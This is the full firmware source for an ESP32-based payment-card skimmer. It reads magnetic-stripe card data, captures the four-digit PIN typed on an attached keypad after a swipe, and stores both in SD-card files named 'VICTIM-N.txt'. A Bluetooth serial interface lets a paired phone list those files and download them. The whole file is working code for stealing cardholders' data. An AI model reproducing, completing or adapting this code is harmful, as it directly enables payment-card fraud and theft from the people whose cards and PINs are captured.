#include <BluetoothSerial.h>
#include <SPI.h>
#include <SD.h>
#include <RTClib.h>
#include <MagStripe_ESP32.h>
#include <Keypad.h>

//SPI-PERIPHERAL PIN ASSIGMENTS
#define HSPI_MISO 12
#define HSPI_MOSI 13
#define HSPI_SCLK 14
#define HSPI_CS 15

//MAGTEK 21050145 CARD READER PIN ASSIGNMENTS
#define MAGSTRIPE_RDT 23 //DATA  (YELLOW) 
#define MAGSTRIPE_CLS 22 //CP    (GREEN)
#define MAGSTRIPE_RCL 21 //CLOCK (WHITE)

//DS3231 RTC MODULE PIN ASSIGNMENTS
#define DS3231_SQW 2


/*BEGIN CARD READER VARIABLES*/
static const byte DATA_BUFFER_LEN = 108;
static char data[DATA_BUFFER_LEN];
String newCard;
MagStripe card;
unsigned int numSwipes = 0;
/*END CARD READER VARIABLES*/

/*BEGIN KEYPAD VARIABLES*/
const byte ROWS = 4;  //four rows
const byte COLS = 4;  //three columns
char keys[ROWS][COLS] = {
  { '1', '2', '3', 'A' },
  { '4', '5', '6', 'B' },
  { '7', '8', '9', 'C' },
  { '*', '0', '#', 'D' }
};
byte rowPins[ROWS] = { 19, 18, 5, 4 };    //connect to the row pinouts of the keypad
byte colPins[COLS] = { 26, 25, 33, 32 };  //connect to the column pinouts of the keypad
Keypad keypad = Keypad(makeKeymap(keys), rowPins, colPins, ROWS, COLS);
/*END KEYPAD VARIABLES*/

/*BEGIN PIN MONITORING VARIABLES*/
String pinData = "";
int keyPress = 0;
uint32_t keyPressTimer;
/*END PIN MONITORING VARIABLES*/

/*BEGIN TIMEKEEPING VARIABLES*/
volatile byte TIME_FLAG_1HZ = false;
unsigned long Days = 0;
unsigned int Hours = 0;
unsigned int Minutes = 0;
unsigned int Seconds = 0;
/*END TIMEKEEPING VARIABLES*/

/*BEGIN PERSISTENT STATE VARIABLES*/
String command = "";
int mode = 0;
/*END PERSISTENT STATE VARIABLES*/

/*BEGIN BLUETOOTH RELATED CODE*/
BluetoothSerial SerialBT;

void InitBluetooth() {
  SerialBT.begin("ESP32-CR"); //Bluetooth device name
  Serial.println("[DEBUG] The device started, now you can pair it with bluetooth!");
}
/*END BLUETOOTH RELATED CODE*/

/*BEGIN SD-CARD RELATED CODE*/
File currentFile;
String currentFileName;
SPIClass SPI_SD(HSPI);

void SD_Mount() {
  SPI_SD.begin(HSPI_SCLK, HSPI_MISO, HSPI_MOSI);
  if (!SD.begin(HSPI_CS, SPI_SD)) {
    Serial.println("[DEBUG] SD-CARD FAILED TO MOUNT!");
    return;
  } else {
    Serial.println("[DEBUG] SD-CARD SUCCESSFULLY MOUNTED!");
  };
}

void SD_Umount() {
  SPI_SD.end();
  SD.end();
  Serial.println("[DEBUG] SD-CARD SUCCESSFULLY DISMOUNTED!");
}
/*END SD-CARD RELATED CODE*/

/*BEGIN COMMAND OVER BLUETOOTH SERIAL PARSING CODE*/ 
void processCommand(String cmd) {
  // Check if the command is "listDir"
  if (cmd == "listDir") {
    printDirectory();
  }
  // Check if the command starts with "download VICTIM-"
  else if (cmd.startsWith("download VICTIM-")) {
    int startIndex = cmd.indexOf("VICTIM-") + 7; // 7 is the length of "VICTIM-"

    // Find the position of ".txt"
    int endIndex = cmd.indexOf(".txt");

    if (startIndex >= 0 && endIndex > startIndex) {
      // Extract the substring representing the number
      String numberStr = cmd.substring(startIndex, endIndex);

      // Convert the extracted string to an integer
      int number = numberStr.toInt();
      transmitFile(number);
    }
  }
  else if (cmd.startsWith("mode select ")) {
    int startIndex = cmd.indexOf("mode select ") + 12; // 12 is the length of "mode select "

    // Assuming there's a whitespace or the end of the string after the number
    int endIndex = cmd.indexOf(' ', startIndex);
    if (endIndex == -1) { // if no whitespace is found
        endIndex = cmd.length();
    }

    if (startIndex >= 0 && endIndex > startIndex) {
      // Extract the substring representing the number
      String numberStr = cmd.substring(startIndex, endIndex);

      // Convert the extracted string to an integer
      mode = numberStr.toInt(); 
      Serial.println("[DEBUG] MODE " + String(mode) + " SELECTED");    
    }
}
 
  
}
/*END COMMAND OVER BLUETOOTH SERIAL PARSING CODE*/ 

/*BEGIN COMMAND FUNCTIONS - (MCU to BT-HOST)*/

   /* [NOTE REGARDING "transmitFile(int)" FUNCTION]
    * 
    * The "transmitFile(int)" function facilitates the sending of
    * text files to a host device using the microcontroller's through
    * a serial UART connection over bluetooth. The host device must be
    * programmed to recognize the serial data stream, meaning the 
    * microcontroller must send a START and STOP signal to indicate 
    * the begining and end of a stream of data representing the contents 
    * of a text file. 
    */

void transmitFile(int fileNumber) {
  SD_Mount();
  String textFileName = "/VICTIM-" + String(fileNumber) + ".txt";
  File textFile = SD.open(textFileName);
  if (textFile) 
  { 
    String transmissionString = "[BEGIN]\n";
    while (textFile.available()) 
    {
        transmissionString.concat(textFile.readString()); 
    }
    transmissionString.concat("[END]\n");
    Serial.print(transmissionString);
    SerialBT.print(transmissionString);
    transmissionString = "[BEGIN]\n";
               
    textFile.close();
  }
  SD_Umount();
}

void printDirectory() {
   SerialBT.flush();
   SD_Mount();
   File dir = SD.open("/");
   while (true) {
      File entry = dir.openNextFile();
      if (! entry) {
         // no more files
         break;
      }
      if (entry.isDirectory()) {
         continue; //Skip directories...
      } else {
         delay(15);
         SerialBT.print(String(entry.name()) + "\r\n");
         delay(15);
      }
      entry.close();
   }
   SD_Umount();
}
/*END COMMAND FUNCTIONS - (MCU to BT-HOST)*/

/*BEGIN RTC FUNCTIONS*/
void Init_RTC() {
  pinMode(DS3231_SQW, INPUT_PULLUP);
  digitalWrite(DS3231_SQW, HIGH);
  attachInterrupt(digitalPinToInterrupt(DS3231_SQW), RTC_ISR, FALLING);
}

void RTC_ISR() {
  TIME_FLAG_1HZ = true;
}

String getTime() {
  Seconds++;
  if (Seconds >= 60) {
      Seconds = 0;
      Minutes++;
      if (Minutes >= 60) {
          Minutes = 0;
          Hours++;
          if (Hours >= 24) {
              Hours = 0;
              Days++;
          }
      }
  }  
  char buffer[20]; // Buffer to hold the formatted string
  sprintf(buffer, "%lu:%02u:%02u:%02u", Days, Hours, Minutes, Seconds);
  return String(buffer);
}
/*END RTC FUNCTIONS*/

/*BEGIN DATA RECORDING FUNCTIONS*/
void writeCardData() {
  SD_Mount(); //Mount SD CARD
  newCard = String(data);
  Serial.println(newCard);
  currentFileName = "/VICTIM-" + String(numSwipes) + ".txt";
  if (SD.begin(HSPI_CS, SPI_SD))
    Serial.println(currentFileName + " CARD DATA WRITTEN TO SD CARD!");
  currentFile = SD.open(currentFileName, "a");
  currentFile.println("CARD DATA: " + newCard);
  currentFile.close();
  SD_Umount(); //Unmount SD CARD
}

void writePinData() {
  SD_Mount();
  newCard = String(data);
  Serial.println(newCard);
  currentFileName = "/VICTIM-" + String(numSwipes) + ".txt";
  if (SD.begin(HSPI_CS, SPI_SD))
    Serial.println(currentFileName + " PIN DATA WRITTEN TO SD CARD!");
  currentFile = SD.open(currentFileName, "a");
  currentFile.println("PIN DATA: " + pinData);
  currentFile.close();
  SD_Umount();
}
/*END DATA RECORDING FUNCTIONS*/

void setup() {
  Serial.begin(9600);
  Init_RTC();
  InitBluetooth();
  card.begin(2);
}

void loop() {
  
  
  //After the first swipe, begin recording PIN data...
  if(numSwipes > 0) 
  {
      char key = keypad.getKey();
      if (key) 
      {
        Serial.print(key);
        keyPress++;
        pinData += String(key);
        if (keyPress % 4 == 0) {
          writePinData();
          keyPress = 0;
          pinData = "";
        }
    }
  }
  
  

  // Don't do anything if there isn't a card present...
  if (!card.available()) {
    //Reading input from phone...
    if (SerialBT.available()) {
      char character = SerialBT.read();
      if (character != '\n') {
        command += String(character);
      } else {
      // Process the command when newline is received
      processCommand(command);
      // Reset the command for next input
      command = "";
      }
      Serial.write(character);
    }
    if(TIME_FLAG_1HZ) {
      TIME_FLAG_1HZ = false;
      if(mode == 0) {
        SerialBT.print(getTime() + "," + String(numSwipes) + "," +  temperatureRead() + "\n");
      } 
    }
    return;
  }

  // Read the card into the buffer "data" (as a null-terminated string)...
  short chars = card.read(data, DATA_BUFFER_LEN);

  // If there was an error reading the card, blink the error LED...
  if (chars < 0) {
    Serial.println("ERROR");
    return;
  } else {
    numSwipes++;
    writeCardData();
  }
}
